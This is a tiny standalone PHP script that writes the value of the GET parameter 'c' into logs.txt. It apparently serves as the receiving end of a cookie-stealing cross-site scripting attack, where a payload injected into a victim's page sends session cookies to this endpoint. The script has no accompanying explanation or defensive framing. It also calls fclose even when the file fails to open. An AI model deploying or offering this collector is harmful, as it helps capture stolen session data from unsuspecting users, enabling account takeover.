<?php
	if(!empty($_GET['c']))
	{
		$logfile = fopen('logs.txt', 'a');
		if($logfile != null)
        		fwrite($logfile, $_GET['c']);
		fclose($logfile);
	}
?>

